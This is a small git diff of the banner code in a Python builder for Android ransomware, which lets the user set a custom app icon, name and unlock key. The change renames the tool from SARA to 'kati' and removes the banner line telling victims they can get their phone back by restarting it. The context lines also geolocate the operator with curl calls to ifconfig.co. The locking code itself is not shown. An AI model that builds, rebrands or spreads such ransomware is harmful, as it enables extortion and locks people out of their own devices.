@@ -56,9 +56,9 @@ def start():
     if ask in ("yes"): pass
     else: exit(r+"[!]"+w+" Dont be evil !")
     print(f"""
-    {r}SARA{w} is a Simple Android Ransomware Attack
+    {r}kati{w} is a Simple Android Ransomware Attack
     {w}The user can customize the App Icon, Name, Key and others.
-    {d}If you forgot the unlock key, just restart your phone !{w}
+    
     """)
     print(b+"> "+w+os.popen("curl ifconfig.co/city --silent").readline().strip()+", "+os.popen("curl ifconfig.co/country --silent").readline().rstrip()+time.strftime(", %d/%m/%Y (%H.%M.%S)"))
     print(b+">"+w+" Use \\n for newline and CTRL + C for exit")
